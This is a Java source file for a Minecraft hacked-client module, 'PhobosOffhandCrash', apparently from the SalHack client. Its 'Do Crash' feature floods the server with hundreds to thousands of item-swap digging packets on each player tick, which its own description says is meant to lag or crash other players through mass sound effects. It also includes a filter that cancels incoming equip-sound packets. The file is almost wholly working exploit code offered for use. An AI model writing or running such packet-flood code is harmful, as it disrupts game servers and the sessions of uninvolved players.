package me.ionar.salhack.module.exploit;

import me.ionar.salhack.events.client.EventClientTick;
import me.ionar.salhack.events.network.EventNetworkPacketEvent;
import me.ionar.salhack.events.player.EventPlayerUpdate;
import me.ionar.salhack.main.SalHack;
import me.ionar.salhack.main.Wrapper;
import me.ionar.salhack.module.Module;
import me.ionar.salhack.module.Value;
import me.ionar.salhack.util.Timer;
import me.zero.alpine.fork.listener.EventHandler;
import me.zero.alpine.fork.listener.Listener;
import net.minecraft.client.gui.GuiDisconnected;
import net.minecraft.client.gui.GuiDownloadTerrain;
import net.minecraft.client.gui.GuiMainMenu;
import net.minecraft.client.gui.GuiMultiplayer;
import net.minecraft.client.multiplayer.GuiConnecting;
import net.minecraft.init.SoundEvents;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.network.play.server.SPacketSoundEffect;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.math.BlockPos;

public class PhobosOffhandCrashModule extends Module{
	public final Value<Boolean> antilag = new Value<Boolean>("AntiOffhandCrash", new String[] {"AOC"}, "It protects you from other player doing the crash.", true);
	public final Value<Boolean> docrash = new Value<Boolean>("Do Crash", new String[] {"C"}, "Crash players.", true);
	public final Value<Integer> loopzz = new Value<Integer>("Loop Times", new String[] {"LT"}, "Times to loop the crash.", 500, 100, 5000, 10);
	
	public PhobosOffhandCrashModule() {
		super("PhobosOffhandCrash", new String[] {"POF"}, "Spams server with item swap packets to lag/crash other players with large amounts of sound.", "NONE", 0xDB6824, ModuleType.EXPLOIT);
	}
	
	@EventHandler
	private Listener<EventNetworkPacketEvent> PacketEvent = new Listener<>(p_Event -> {
		if(!SalHack.inGame() && this.isEnabled()) toggle();
		if(!this.isEnabled()) return;
		
        if (this.antilag.getValue() && p_Event.getPacket() instanceof SPacketSoundEffect) {
            final SPacketSoundEffect packet = (SPacketSoundEffect) p_Event.getPacket();
            if (packet.getSound() == SoundEvents.ITEM_ARMOR_EQUIP_GENERIC) {
                p_Event.cancel();
            }
        }
	});
	
	Timer timer = new Timer();
	
	@EventHandler
	private Listener<EventClientTick> OnClientTick = new Listener<>(p_Event -> {
		if(!this.isEnabled()) return;
		if(timer.passed(5000)) {
			if(!SalHack.inGame()) toggle();
			
			timer.reset();
		}
	});
	
	@EventHandler
	private Listener<EventPlayerUpdate> OnPlayerUpdate = new Listener<>(p_Event -> {
		if(!this.isEnabled()) return;
		if(!SalHack.inGame()) return;
		
        if (this.docrash.getValue()) {
            for (int i = 0; i < this.loopzz.getValue(); ++i) {
                final BlockPos playerBlock = new BlockPos(Wrapper.GetMC().player.posX, Wrapper.GetMC().player.posY - 1.0, Wrapper.GetMC().player.posZ);
                Wrapper.GetMC().player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, playerBlock, EnumFacing.UP));
            }
        }
        if ((Wrapper.GetMC().currentScreen instanceof GuiMainMenu || Wrapper.GetMC().currentScreen instanceof GuiDisconnected || Wrapper.GetMC().currentScreen instanceof GuiDownloadTerrain || Wrapper.GetMC().currentScreen instanceof GuiConnecting || Wrapper.GetMC().currentScreen instanceof GuiMultiplayer) && this.isEnabled()) {
            this.toggle();
        }
	});
}